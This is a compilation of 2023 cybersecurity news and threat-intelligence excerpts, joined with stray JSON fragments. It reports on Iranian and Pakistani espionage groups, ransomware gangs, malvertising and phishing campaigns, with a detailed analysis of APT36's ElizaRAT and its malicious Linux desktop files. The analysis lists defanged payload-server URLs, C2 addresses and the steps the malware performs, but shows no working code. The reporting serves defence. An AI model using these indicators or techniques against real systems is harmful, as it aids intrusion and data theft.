phase of this campaign, Peach Sandstorm conducted password spray campaigns against thousands of organizations across several sectors and geographies. While Microsoft observed several organizations previously targeted by Peach Sandstorm, the volume of activity and range of organizations suggests that at least a subset of the initial activity is opportunistic.Unlike password spray operations which are noisy by definition, a subset of Peach Sandstorm’s 2023 post-compromise activity has been stealthy and sophisticated. Many of the cloud-based tactics, techniques, and procedures (TTPs) seen in these most recent campaigns are materially more sophisticated than capabilities used by Peach Sandstorm in the past.Microsoft observed Peach Sandstorm using two distinct sets of TTPs in the early stages of the intrusion lifecycle in 2023 attacks. In later stages of known compromises, the threat actor used different combinations from a set of known TTPs to drop additional tools, move laterally, and ultimately exfiltrate data from a target.Password spray activityBetween February and July 2023, Peach Sandstorm carried out a wave of password spray attacks attempting to authenticate to thousands of environments. Password spraying is a technique where threat actors attempt to authenticate to many different accounts using a single password or a list of commonly-used passwords. Unlike brute force attacks that target a single account using many passwords, password spray attacks help adversaries maximize their chances for success and minimize the likelihood of automatic account lockouts.Even a single compromised account could allow an adversary to conduct reconnaissance, move laterally, or access sensitive resources, often without attracting attention from defenders.Long-running password spray campaigns offer insight into adversaries’ pattern of life. Activity observed in this campaign aligned with an Iranian pattern of life, particularly in late May and June, where activity occurred almost exclusively between 9:00 AM and 5:00 PM Iran Standard Time (IRST). While Peach Sandstorm has carried out high-volume password spray campaigns in the past, elements of the most recent campaign were unique. Specifically, Peach Sandstorm consistently conducted the password sprays from TOR IPs and used a “go-http-client” user agent.Internal reconnaissance with AzureHound or RoadtoolsAzureHound and Roadtools have functionality that is used by defenders, red teams, and adversaries. The same features that make these tools useful to legitimate users, like pre-built capabilities to explore and seamlessly dump data in a single database, also make these tools attractive options for adversaries seeking information about or from a target’s environment.Multiple persistence mechanismsIn cases where Microsoft observed this particular intrusion chain, the threat actor used one or more persistence mechanisms. In some cases, Peach Sandstorm created a new Azure subscription on a target’s tenant and/or leveraged previously compromised Azure resources. These subscriptions were subsequently used to facilitate communication with Peach Sandstorm’s infrastructure.Initial access using remote exploitationIn this wave of activity, Peach Sandstorm also attempted to exploit vulnerabilities with a public proof-of-concept (POC) in Zoho ManageEngine or Confluence, to access targets’ environments.The following post-compromise activity affected organizations in the defense, satellite, and pharmaceutical sectors:As Peach Sandstorm increasingly develops and uses new capabilities, organizations must develop corresponding defenses to harden their attack surfaces and raise costs for these attacks. Microsoft will continue to monitor Peach Sandstorm activity and implement robust protections for our customers.To harden an attack surface against Peach Sandstorm activity, defenders can implement the following:Securing critical assets like AD FS servers is a high-value measure to protect against golden SAML attacks. The guidance provided below is applicable beyond just Peach Sandstorm activity and can help organizations harden their attack surfaces against a range of threats.Alerts with the following titles in the security center can indicate Peach Sandstorm activity on your network:The following alerts might indicate activity associated with password spray campaigns.The following alerts might indicate activity associated with password spray campaigns.\n\t\t\tChina-based actor Flax Typhoon is exploiting known vulnerabilities for public-facing servers, legitimate VPN software, and open-source malware to gain access to Taiwanese organizations, but not taking further action.\t\t\n\t\t\tMicrosoft Threat Intelligence has identified highly targeted social engineering attacks using credential theft phishing lures sent as Microsoft Teams chats by the threat actor that Microsoft tracks as Midnight Blizzard (previously tracked as NOBELIUM). \t\t\n\t\t\tChinese state-sponsored actor Volt Typhoon is using stealthy techniques to target US critical infrastructure, conduct espionage, and dwell in compromised environments.\t\t\n\t\t\tToday, Microsoft is reporting on a distinct subset of Mint Sandstorm (formerly known as PHOSPHORUS), an Iranian threat actor that specializes in hacking into and stealing sensitive information from high-value targets. This subset is technically and operationally mature, capable of developing bespoke tooling and quickly weaponizing recently disclosed vulnerabilities. \t\tMicrosoft is a leader in cybersecurity, and we embrace our responsibility to make the world a safer place."

These ad components make the advertisement appear legitimate and indistinguishable from a real advertisement from Cisco.The threat actors can exploit a loophole in the Google Ad platform's tracking template that allows them to redirect at will while complying with Google's policy.The policy mandates that the display URL of an ad and the final URL must belong to the same domain. Still, nothing is stopping the tracking template from redirecting users to a website outside the indicated domain.In this case, the threat actors used a Firebase URL (\"trixwe.page.link\") as their tracking template, with a final URL of https://www.webex.com.However, if the ad is clicked, the visitor is redirected to the \"trixwe.page[.]link,\" which filters out visits that appear to originate from researchers and automated crawlers.If the user is one they wish to target, it will redirect them to the site \"monoo3at[.]com,\" where further checks are performed to determine if they are potential victims or researchers using a sandbox.If the visitor is one the threat actors wish to target, they will be redirected to a malware-dropping site at \"webexadvertisingoffer[.]com,\" while all others will be redirected to Cisco's legitimate \"webex.com\" site.If visitors of the fake Webex page click on the download buttons, they receive an MSI installer that spawns several processes and runs PowerShell commands to install the BatLoader malware.This malware will ultimately fetch, decrypt, and execute an additional DanaBot malware payload.Those infected with DanaBot will have their credentials stolen and sent to the attackers, who will either use them for further attacks or sell them to other threat actors.When looking to source software, it is a good practice to always skip promoted results on Google Search and only download directly from the software developer or a well-known, trusted site.Update 9/15 - A Google spokesperson has sent BleepingComputer the following comment:Protecting users is our top priority.

      "text": " In a statement today, the BlackCat ransomware group claims that they had infiltrated MGM’s infrastructure since Friday and encrypted more than 100 ESXi hypervisors after the company took down the internal infrastructure.The gang says that they exfiltrated data from the network and maintain access to some of MGM’s infrastructure, threatening to deploy new attacks unless an agreement to pay a ransom is reached.In their statement today, BlackCat says that MGM Resorts remained silent on the provided communication channel, indicating that the company has no intention to negotiate a ransom payment.The hackers stress that the only action they saw from MGM was in response to the breach, disconnecting “each and every one of their Okta Sync servers after learning that we had been lurking on their Okta Agent servers.”The attacker claims they were trying to sniff any passwords that they could not recover from the domain controller hash dumps.Despite shutting down the synchronization Okta servers, the hackers continued to be present on the network, BlackCat says in their statement.They claimed to still have super administrator privileges on MGM’s Okta environment and Global Administrator permissions to the company’s Azure tenant.After seeing MGM taking this action and with no intention from the company to engage in negotiations over the provided chat, the threat actor says that they deployed the ransomware attack.“After waiting a day, we successfully launched ransomware attacks against more than 100 ESXi hypervisors in their environment on September 11th after trying to get in touch but failing. This was after they brought in external firms for assistance in containing the incident,” - BlackCat/ALPHV.At this moment, the hackers say that they do not know what type of data they stole from MGM but promise to extract relevant information and share it online unless they reach an agreement with MGM.To pressure the company even more into paying, BlackCat threatened to use their current access to MGM’s infrastructure to “carry out additional attacks.”BleepingComputer was not able to independently confirm BlackCat's claims and MGM has not replied to our emails.Scattered Spider is believed to be a group of threat actors who are known use a wide range of social engineering attacks to breach corporate networks.Unlike most ransomware affiliates who are from CIS countries, researchers believe that the hacking group consists of English-speaking teenagers and young adults ranging from 16-22 years of age.Furthermore, due to the similar tactics, researchers have noticed a connection between Scattered Spider and the Lapsus$ hacking group, which had a similar makeup for members and tactics.While the ransomware component is a relatively new tactic of the hacking group, almost all of their attacks involve extortion, where they demand million-dollar ransoms in return for not publishing data or to receive an decryptor."

This happened in 36% of real-world cloud incidents, with credentials either discovered during an attack or stolen prior to targeting a specific victim, the report noted.Poor security practices are making matters far easier for attackers than they should be. The X-Force team found plaintext credentials located on user endpoints in a third (33%) of engagements involving cloud environments.In joint second place as the next most common access vectors were exploitation of public-facing applications and phishing and spear phishing, which accounted for 14% each of engagements.Although all regions suffered cloud-based attacks, Europe accounted for the vast majority (64%) followed by North America at 29%.

The ransomware attempts to stop multiple services on the infected computer before it begins encrypting files,” Symantec explained in a blog post.“Once encryption is complete, it attempts to delete Volume Shadow (VSS) copies. It is still unclear whether its authors have any links to known cybercrime organizations.”The threat actors that deployed 3AM first used the “gpresult” command to dump policy settings for specific users. They also executed several Cobalt Strike components and tried to escalate privileges on the computer using PsExec, before running reconnaissance commands and attempting to enumerate other servers for lateral movement.An extra user was also added to maintain persistence, while a Wput tool was used to exfiltrate victim files to an FTP server under the attackers’ control.However, although 3AM was used after LockBit was initially blocked, this backup strategy was not 100% successful.The threat actor was only able to deploy 3AM to three machines on the victim organization’s network and it was blocked on two of these three, Symantec said.“New ransomware families appear frequently and most disappear just as quickly or never manage to gain significant traction. However, the fact that 3AM was used as a fallback by a LockBit affiliate suggests that it may be of interest to attackers and could be seen again in the future.”"

      "text": " The threat group behind the fast-growing Rhysida ransomware-as-a-service operation has claimed credit for an Aug. 19 attack that crippled systems at Singing River Health System, one of Mississippi's largest healthcare entities.The attack on Singing River impacted three hospitals and some 10 clinics belonging to the system and is likely to reinforce Rhysida's credentials as a growing threat to healthcare organizations in the US. It's also a reminder of the surging interest in the sector from ransomware actors who, early in the COVID-19 pandemic, had piously vowed to stay away from attacking hospitals and other healthcare entities.Sergey Shykevich, threat intelligence group manager at Check Point Software, which is tracking the Rhysida operation, says he can confirm the Rhysida group recently posted a small sample of data apparently belonging to Singing River on its leak disclosure site. The group has said it is willing to sell all the data it has from the healthcare system for 30 Bitcoin — or roughly $780,000 at today's rates. \"We sell only to one hand, no reselling you will be the only owner,\" the group's post noted.Rhysida — named after a genus of centipede — surfaced in May and has quickly established itself as a potent threat in the ransomware space. The group initially targeted organizations in the education, manufacturing, technology, managed service provider, and government sectors. Its attack on Prospect signaled the threat group's expansion into the healthcare sector.The malware itself is a 64-bit Portable Executable Windows encryption app that, according to the Health Sector's Cybersecurity Coordination Center, still appears to be in the early stages of development. Threat actors are distributing the malware via phishing emails and by using Cobalt Strike and other post-exploit attack tools to drop it on previously compromised systems.Check Point says its researchers have observed Rhysida actors use a variety of tactics for lateral movement on compromised networks, including via Remote Desktop Protocol, Remote PowerShell sessions, and the PSExec remote admin tool. Like almost every other major ransomware group, Rhysida actors steal data from their victim before encrypting it. They have then used the threat of data exposure as additional leverage to try to extract money from their victims.The Rhysida operation's expansion into the healthcare space is a reflection of how valuable the sector is for threat actors. For those with criminal intent, healthcare organizations present a veritable treasure trove of personal identity and health information that they can monetize in myriad ways. Threat actors also know that health entities are likely more inclined to negotiate their way out of an attack — by paying a ransom, for instance — to avoid disruptions that can impede their ability to deliver patient care.\"Attacks on healthcare providers have two main significant implications,\" Shykevich says. \"The hospital's ability to provide basic services to its patients and [on] the patients' sensitive data. Following such cyberattacks, the data quickly makes its way to Dark Web markets and forums.\"\"Within Claroty's Global Healthcare Security Study 2023, 61% of our 1,110 respondents noted a substantial or moderate impact to the quality of care, with another 15% acknowledging severe impacts to patient safety,\" says Ty Greenhalgh, healthcare industry principal at Claroty.Some 43% of ransomware incidents in Claroty's healthcare cybersecurity study involved ransoms of between $100,000 and $1 million, Greenhalgh says, noting ﻿that ransomware attacks on health systems have a ripple effect.\"Hospitals adjacent to healthcare delivery organizations affected by ransomware attacks may see increases in patient census and may experience resource constraints affecting time-sensitive care for conditions such as acute stroke,\" he says. \"They may also cause disruptions of healthcare delivery at adjacent hospitals within a community and could be considered a regional disaster.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

Such information will usually be shared “on an anonymized and aggregate basis,” although “incident-specific details” will also be handed over when a case is of “national significance,” the two said.To minimize disruption to organizations in the aftermath of serious incidents, the ICO and NCSC also committed to “deconflict,” with the regulator set to advise companies to use the NCSC as their main contact in order to prioritize risk mitigation above regulatory matters.Both parties have also agreed to work together on cybersecurity guidance and awareness-raising initiatives, and to provide ongoing feedback on the relationship in order to drive continuous improvement.“This new MoU with the information commissioner builds on our existing relationship and will boost the UK’s digital security,” said NCSC CEO, Lindy Cameron.“It provides us with a platform and mechanism to improve cybersecurity standards across the board while respecting each other’s remits.”Information commissioner, John Edwards, explained that the ICO already works closely with the NCSC to offer cybersecurity advice and support."

      "text": " Deputy Editor, Infosecurity MagazineMicrosoft has detailed a new phishing campaign in which corporate employees are targeted via MS Teams.The tech giant said the campaign is being perpetrated by financially motivated threat actor Storm-0324. This group acts as a “distributor” in the cyber-criminal community, distributing the payloads of other attackers after achieving initial network compromise via email-based initial infection vectors.This often leads to dangerous follow-on attacks like ransomware.Since 2019, the group has primarily distributed JSSLoader, handing off access to ransomware actor Sangria Tempest, according to Microsoft.The new Storm-0324 campaign was first observed in July 2023, in which it sends phishing lures over business communication platform MS Teams.Microsoft believes the group utilizes a publicly available tool called TeamsPhisher to send the links, which leads to a malicious SharePoint-hosted file. TeamsPhisher is a Python-language program that enables Teams tenant users to attach files to messages sent to external tenants.Commenting on the new campaign, Mike Newman, CEO of My1Login noted that phishing attacks via Teams are proving a particularly fruitful tactic for malicious actors.“This is a sophisticated phishing scam that will catch out many victims because they will not realize criminals can hijack on Microsoft Teams to carry out attacks.“People understand the techniques criminals can use to send phishing scams via email, but with Teams being seen as an internal communications platform, employees place more trust in the tool and are more likely to open and action documents they receive in chats,” explained Newman.Microsoft has taken action to better defend against phishing campaigns using Teams, including suspended identified accounts and tenants associated with inauthentic or fraudulent behavior.The firm also provided a number of recommendations for Teams’ customers to reduce the risk of being compromised by these campaigns, including:"

      "text": " The relatively little effort that it took to find the flaws raises questions about the overall security of the service, according to researchers from Orca Security, who found the flaws.All discovered vulnerabilities were cross-site scripting (XSS) issues that posed a significant risk to data and user privacy. An attacker could have exploited the vulnerabilities to hijack Web sessions and put user data at risk, the security vendor said. \"With any of these XSS vulnerabilities, an attacker could have delivered a malicious payload to any unsuspecting user of the relevant Apache service, such as Hadoop, Spark, and Oozie,\" says Lidor Ben Shitrit, cloud security researcher at Orca Security.With a stored XSS flaw, the malicious script is permanently stored on the target Web server and executed every time a user visits the page. A reflected XSS flaw, on the other hand, allows an attacker to inject malicious code into the site URL that executes immediately when a user clicks on a link to that URL. XSS flaws have consistently figured in the Open Web Application Security Project (OWASP) list of common vulnerabilities for years.Ben Shitrit says the first XSS flaw that Orca discovered in Azure HDInsight was in a Hadoop cluster management technology called Apache Ambari. Orca researchers discovered they were multiple default parameters in the technology that they could modify in a relatively straightforward manner. Surprised at how easy it was, they looked around the see if they could find more.\"In summary, the first XSS vulnerability that we found in Apache Ambari Background Operations was surprisingly simple,\" Ben Shitrit says. \"Armed with this knowledge we knew that if we dug deeper, we'd probably find more, which is how we ended up finding seven additional ones.” The fact that Orca was able to uncover eight XSS vulnerabilities in Azure HDInsight via Apache Services in a few days calls into question the overall security of the service, he says.Microsoft issued CVEs for each of the flaws and assessed them as being of \"important\" severity, which is a designation that is a step lower from \"critical.\" The company described each of the flaws as issues that an attacker would be able to exploit only with some level of user interaction. \"An attacker would have to send the victim a malicious file that the victim would have to execute,\" Microsoft said, adding that the attacker would need to have administrator level privileges to be able to exploit the flaws.Ben Shitrit says there's not a whole lot that organizations can do that is specific to Azure HDInsight to make it more secure, other than to always apply Microsoft's patches for the technology. \"But by following security best practices, such as implementing a Content Security Policy (CSP), performing input validation and output encoding, as well as adhering to the principle of least privilege, they can reduce their exposure to XSS vulnerabilities in general,\" he says.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " For six months, medical device makers have had to comply with new cybersecurity regulations aimed at hardening medical devices against cyber attacks, but the US Food and Drug Administration has largely refrained from using its \"refuse to accept\" power up to now. On Oct. 1, the FDA's grace period — during which the agency stated it would try not to use its ability to reject medical devices that lack appropriate cybersecurity controls and a post-market patching capability — will end. The manufacturers of medical cyber devices must now submit plans to monitor and patch post-market cybersecurity vulnerabilities, have a process in place for the secure design and development of devices, and provide a software bill of materials (SBOM) to the FDA. Those who do not satisfy the requirements could have their devices rejected on the grounds that they pose too great a cyber risk.\"This legislation addresses specifically that you have to do something about patching and updating on the new devices, and how are you going to get patches and updates out over the lifecycle in a reasonable time,\" he says. \"The way this is set up, it's given broad authority for interpretation to the FDA on what it takes to get medical devices cyber-secure and what are the penalties, if you are not compliant with their interpretation.\"The FDA, which allocated $5 million of its budget to medical device cybersecurity, could change that.Putting these new requirements into law is a first step, but is far from being an answer in and of itself, says David Brumley, a cybersecurity professor at Carnegie Mellon and CEO of software security firm ForAllSecure.\"We're building a muscle at this point, and that muscle isn't gonna allow us to lift this open-source [security] weight yet. But if we don't start building this muscle we won't be able to in 20 years,\" he says. \"I just wish that they took it a step further, to say how they're going to hold people responsible, and what powers they have to hold people responsible.\"While the government has correctly avoided prescribing technological measures in law due to rapidly changing technology, the legislation could have created a board of experts to determine the best practices for securing medical devices, says Brumley.\"If you don't want the government dictating exactly how you should do things, because that can be slow and bureaucratic, then you should have an industry board that says what [the best practices] are for a practitioner,\" he says. Brumley points out engineers building bridges have industry- and government-prescribed standards and codes to follow for due diligence, and could be found negligent if they don't follow them. \"These requirements are so vague that you could do basically nothing, other than maybe running an SCA (software component analysis) scan, and you would satisfy the legislation.\"In addition, the law does not have a component that addresses the legacy devices out there, which are among the most vulnerable, some of which are 15 years old, adds Claroty's Greenhalgh.\"This legislation is designed to start addressing the problem, but even if you are plugging the hole in the boat ... it's not really clear in the legislation what are you going to do about the legacy devices,\" he says.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " In a recent attack against a construction company, hackers who failed to execute LockBit in a target network were observed deploying a second, never-before-seen ransomware, which managed to break through.The new tool is rather standard fare, blocking various cybersecurity and backup-related software before locking up files on its host computer. But it distinguishes itself with an adorable little theme: 3 a.m., a time when perhaps only insomniacs, hardcore night owls, and black hat hackers are still up and working away.\"This is not the first time we've seen attackers use more than one ransomware family,\" warns Dick O'Brien, principal intelligence analyst for the Symantec threat hunter team. \"Organizations should expect this to happen.\"Upon infiltrating its target network, the threat actors in this case immediately began gathering user information and deploying tools for data harvesting. Early on, for instance, they deployed Cobalt Strike and used the remote command tool PsExec to try to escalate privileges.Next, they ran reconnaissance commands like whoami (prints the username), netstat (displays the network status), and so on; attempted to list other servers they could use for lateral movement; and added a new user for purposes of persistence. Then, they used the Wput utility to upload the victim's files to their own file transfer protocol (FTP) server.But unfortunately for the victim, the attackers had a second cyber weapon on hand: 3AM. The malware is so named because it appends encrypted files with the suffix \".threeamtime\" and references that time of day in its ransom note.\"Hello,\" the note begins. \"'3 am' The time of mysticism, isn't it? All your files are mysteriously encrypted, and the systems 'show no signs of life', the backups disappeared. But we can correct this very quickly and return all your files and operation of the systems to [sic] original state.\"Compared with the note, the authors demonstrated less creativity in writing the malware itself.In this first deployment, attackers only managed to deploy 3AM onto three machines, and it was subsequently blocked on two. It successfully penetrated the third, though, where LockBit could not. Rather than some testament to the power of 3AM, O'Brien figures, \"it likely worked because it was a previously unseen threat, whereas LockBit is known.\" The hackers claim to have stolen sensitive data from the compromised machine, though Symantec could not verify that.When it comes to stopping a piece of ransomware, let alone two, O'Brien advises that \"defense in depth is the best strategy. Ransomware attacks are a multistage operation, and organizations should address all stages of a potential attack and not just focus on blocking payloads.\"\"The earlier you stop an attack, the better,\" he says.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

Currently, the proportion of these workers in government is around 4.5%, which compares to an equivalent industry average of between 8% and 12%.The PAC’s inquiry heard of “particular shortages” of cybersecurity experts in the UK government, whose skills command a “premium.”Dame Meg Hillier MP, Chair of the PAC, said the lack of cyber expertise in the service “should send a chill down the government’s spine.”This digital skills shortage is also hindering the government’s ability to upgrade and address its highest-risk legacy systems.Commenting on the PAC report, Professor Richard Benham, government cybersecurity advisor and leading academic within cybersecurity said the findings were particularly alarming amid the rise of advanced technologies.“The pace of AI and quantum computing, along with tech bio-engineering, means what we define as human will change, and the digital revolution will bring rapid challenges. The government needs cyber experts, and these will be futurists who understand the ripple of impacts on every part of our lives, helping us to get it right first time,” he explained.“What is scary is that there are so few leaders in this field.

APT36 is a sophisticated cyber threat group with a history of conducting targeted espionage operations in South Asia. We observed APT36 targeting Indian government sectors using a previously undocumented Windows RAT, new cyber espionage utilities for Linux, new distribution mechanisms, and a new attack vector used against the Linux environment. In this blog, we will examine the latest tools employed by APT36, which are designed to target both Windows and Linux operating systems.APT36 is an advanced persistent threat (APT) group which we attribute to Pakistan with very high confidence. This group has been active since 2013 and primarily targets the Indian government, defense, and education sectors.This group leverages credential harvesting and malware distribution attacks to conduct cyber espionage. APT36 utilizes:We assigned the moniker “ElizaRAT” to this new Windows-based backdoor utilized by APT36 due to the distinctive strings identified within the commands observed during our real-time analysis of the C2 communication channel.ElizaRAT is distributed as .NET binaries sent inside password-protected archive files hosted on Google Drive links. During our threat analysis, we gathered several samples of ElizaRAT and they all shared these characteristics:For this technical analysis, we use the following file metadata:Since this Windows RAT arrives on the endpoint in the form of a Control Panel applet, the first method called upon execution is CplApplet().This method transfers control to Program().Main() which in turn invokes an asynchronous task -  MainAsync(). Inside this task, all important malicious operations are carried out.The image below shows Program().Main() kick starting the malicious activities on the endpoint.Figure 1: The MainAsync() method used to start the malicious activities on the endpoint.Some of the key operations performed by ElizaRAT are:In the following sections, we dive deeper into some of these operations.Logging OperationEach execution result is logged on both the endpoint (client-side) and the Telegram bot (server-side).The code below shows that logging is done at the local and remote level.\r\n  Unique Identifier GenerationA UUID and username are generated for each infected machine so that the threat actor can uniquely identify the victim. It uses Windows Management Instrumentation (WMI) to fetch the processorID and UUID of the machine, and uses both these details to generate a UUID and username specific to the infected machineThe only difference between the generated UUID and the username is the \".cookie\" extension. The username is the UUID without the \".cookie\" extension.The image below shows the relevant code used to generate these values.Figure 2: The getusername() method used to generate the UUID and username to identify the infected machine. C2 Command FormatSince the threat actor uses the same Telegram bot to manage multiple infected endpoints, they use a specific C2 command format to synchronize the operations and ensure that a given command executes only on the intended endpoint.The C2 command format looks like this:<command>*<username>*<arguments>C2 CommandsAll C2 commands are handled in a switch-case statement by the Bot_OnMessage() method inside the Communicate class. Before the execution of any command, the RAT extracts the username from the C2 command and compares it with the infected machine's username. The command is executed successfully only if both the values match.The following C2 commands are supported by the bot:\r\n  PersistenceIn order to achieve persistence on the infected machine, the bot creates a Windows shortcut file (LNK) in the Windows Startup directory. The image below shows the code used to create this shortcut file. The name of the shortcut file is fetched from the \"orig_name\" setting defined in the config. In this case, the shortcut file is called TextSource.lnk.Figure 3: The buildforts() method used to create a Windows shortcut file in the Startup directory for persistence.The description of this shortcut file is set to \"Text Editing APP for Windows\" to disguise it as a text editing application, making it seem innocuous. In addition, the target command line is set to execute the Control panel applet using rundll32 .Displaying Decoy ContentThe method dosome() defined in the Program class is responsible for displaying the decoy PDF file to the user. This decoy file is present inside the resources section of the .NET binary. The image below shows the decoy file. It is only used to distract the victim and make it appear that an error occurred when opening the file.Figure 4: Decoy PDF file displayed to the user.The utilization of Linux desktop entry files by APT36 as an attack vector has never been documented before. This attack vector is fairly new and appears to be utilized in very low-volume attacks. So far, our research team has discovered three samples - all of which have 0 detection on VirusTotal.We first observed an occurrence in May 2023 when a credential phishing website used to target Indian government employees was also found to be hosting a redirector to distribute ZIP archives containing malicious Linux desktop entry files.National Informatics Center (NIC), India Phishing Attack - May 2023In May 2023, we discovered a credential phishing site, email9ov[.]in, targeting Indian government officials by masquerading as the official login portal for National Informatics Center (NIC), India. We notified NIC in May 2023 about this website and the associated threat intel. We also noticed that the same phishing website was using the hxxps://email9ov[.]in/VISIT_OF_MEDICAL URL to redirect visitors to the hxxp://103.2.232[.]82:8081/Tri-Service-Exercise/Delegation_Saudi_Arabia.zip URL.From here, a visitor would download a ZIP archive containing a maliciously crafted Linux desktop entry file.Here are some technical details about this case:Desktop entry file analysisWe found the following content in the desktop entry file:\r\n  The icon of this desktop entry file is set to \"x-office-document\" to seem like an innocent Office document.The base64-encoded command present inside the desktop entry file decodes to:\r\n  The command decoded above performs the following actions:1. Downloads the decoy PDF and saves it in the /tmp directory with the filename: Delegation_Saudi_Arabia.pdf .2. Downloads the Linux payload and saves it in the /tmp directory with the filename: 185.elf .3. Marks the Linux binary as executable.4. Uses LibreOffice to open and display the decoy PDF file.5. Executes the Linux payload.In this case, the Linux payload was a cross-platform binary designed to run on both Linux and WSL (Windows Subsystem for Linux) machines. Since it did not contain a fully functional C2 mechanism at the time of analysis, we believe it was still in a development phase and used by the threat actor as an initial test.The content inside the decoy PDF file is displayed in the image below. Figure 5: Decoy PDF displayed to the user.The PDF appears to be a document from the Indian Ministry of Defence describing the visit of nine members of a delegation from Saudi Arabia, where they discussed issues with Indian Armed Forces medical officials.Inflated File Attack - June 2023Beginning in June 2023, we detected APT36 establishing their operational infrastructure on a server with the IP address 153.92.220.59. The threat actor proceeded to register multiple domains hosted on this IP. Further insight into this attacker-controlled infrastructure is available in the Threat Actor Infrastructure section.In August, we noted a significant development where few of these domains served as the hosting platform for decoy PDF files. These PDFs were linked within the malicious Linux desktop entry files, which the threat actor distributed enclosed in zip archives.Here are some technical details about this case:Desktop entry file analysisThe first anomaly we observed was the large size of the Linux desktop entry file. A size larger than 1 MB for a Linux desktop entry file is rare. Reviewing the file revealed that the threat actor inflated the size of the file by adding more than a million \"#\" characters. We believe this was an attempt by the threat actor to bypass security scanning solutions.The image below shows the extra characters added to the inflated Linux desktop entry file.Figure 6: The inflated Linux desktop entry file.The relevant content from the Linux desktop entry file is shown below.\r\n  This desktop file performs these main operations:Figure 7: The icon of the desktop configuration file is set to PDF to make it more convincing.At the time of our analysis, the server 64.227.133[.]222 was not serving the Linux payload. We continued monitoring this infrastructure and noticed that on Aug 29, 2023, a new domain called admin-br[.]in was registered and used to distribute a new Linux desktop entry file. In this instance, we were able to retrieve the payloads and conclude the threat attribution to APT36.Here is metadata from the new Linux desktop entry file:The relevant content from the Linux desktop entry file is shown below.\r\n  The functionality of this file is similar to the previous Linux desktop entry file. The image below shows a decoy PDF file displaying an error message stating “Failed to load the PDF document”. This is used to distract the user while malicious activities occur in the background.Figure 8: The decoy PDF file displayed to the user.In this case, the Linux desktop entry file retrieves the malicious Linux payloads from the servers at:The two files retrieved are cleverly named to disguise themselves as legitimate software utilities.Here is the metadata of Linux payloads:The corresponding C2 servers extracted from each malicious Linux payload are listed below.\r\n  The C2 panel for Mythic Poseidon can be accessed by visiting the URI path /new/login on the server running at port 7443. For instance, the C2 panel for 108.61.163[.]195 can be accessed at hxxps://108.61.163[.]195:7443/new/login .Figure 9: The Mythic C2 panel for the Poseidon binary.During our analysis, we also discovered new Python-based ELF binaries used by APT36 for the purpose of cyber espionage. These binaries target the Linux environment in the Indian government organizations and are named to seem like legitimate Linux system services. In this section, we review two types of cyber espionage tools discovered by our research team.GLOBSHELL - Custom-built File exfiltration Linux utilityThe espionage tool under analysis includes this metadata:This ELF binary was compiled using PyInstaller. We extracted the decompiled Python code to understand its functionality. The image below shows the decompiled code.Figure 10: The decompiled code of Python-based cyber espionage tool type 1.These are the key operations performed by this script:We found another ELF binary called mm-precpu-wq with the same functionality as the ELF binary discussed above. However, this binary included  a more in-depth predefined list of file extensions and file paths which it scans to exfiltrate files. In addition to the /media directory, this binary also searches the following paths:PYSHELLFOX - Custom-built Firefox session stealing Linux utilityThe second type of cyber espionage tool we discovered steals the Firefox browser session details of the user if the user has a browser tab open with any of the following titles or URLs:As is evident from this list, the threat actor is interested in exfiltrating the user's Indian government inbox details as well as WhatsApp conversations.The image below shows the relevant code section which does this.Figure 11: The decompiled code Python-based cyber espionage tool type 2.The espionage tool under analysis includes this metadata:These are the key operations performed by this script:Why is APT36 suddenly adding new attack vectors for the Linux environment?We attribute these new Windows and Linux-based attacks to APT36 because their method of serving decoy PDF files, the metadata and their Linux commands are almost identical to previous attacks, which are known and linked to APT36. In addition to this, there is also a C2 infrastructure overlap with previous APT36 attacks which we describe in more detail in the corresponding section.Decoy PDF filesThe decoy PDF file which is dropped in the same directory as the malicious DLL on the victim's machine by ElizaRAT. The metadata of this PDF file indicated the author as \"Apolo Jones\" and the PDF file itself was generated with Microsoft Office Word. In addition to this, the decoy PDF files downloaded from the attacker-controlled servers in the campaign targeting the Linux platform share the same metadata as well.Linux commandsWhile the attack vector used to distribute the Linux payload is entirely new in this campaign, the Linux commands and file paths used in the desktop entry files share similarities with the previous APT36 campaign used to distribute Linux payloads.By comparing the Linux commands used in the decompiled Python code in March 2023 and the Linux commands used in the latest desktop entry files (in August 2023), we can see a clear similarity.The figure below shows a side-by-side comparison of the two.Figure 12: A side-by-side comparison of Linux commands from the March 2023 and August 2023 campaigns executed by APT36.Here is a list of similarities between both cases:In the APT36 attacks observed since April 2023, the threat actor has taken extensive measures to conceal any connection to Pakistan by making it seem that the infrastructure is controlled by a threat actor in India. We assess, with a high-confidence, that this is not a coincidence but rather an intentional deception tactic used by APT36 to avoid the attacks from being attributed to Pakistan.Registrant Country of C2 DomainsBeginning in June 2023, the threat actor started registering several domains on a server with the IP address 153.92.220.59. The IP address is related to the Hostinger ASN. This infrastructure was involved in the attacks distributing malicious Linux desktop entry files discussed earlier.While the WHOIS information for all these domains is redacted, we can still see the registrant country. For most of the domains, the threat actor took sufficient measures to ensure the registrant country is India (IN). However, for one of the domains, admindesk[.]in, we can see the registrant country is PK (Pakistan).The figure below shows examples of WHOIS information for two of the domains registered by the threat actor on the same infrastructure and used in the same attack.Figure 13: A side-by-side comparison of the WHOIS info from two attacker-registered domains related to same campaign and infrastructure.We believe this was an OPSEC mistake by the threat actor.C2 Infrastructure OverlapThere is a C2 infrastructure overlap between the latest campaign and the previous instances of attacks by APT36.Email Associated with Malicious Google Drive LinksElizaRAT is distributed using malicious Google Drive links.

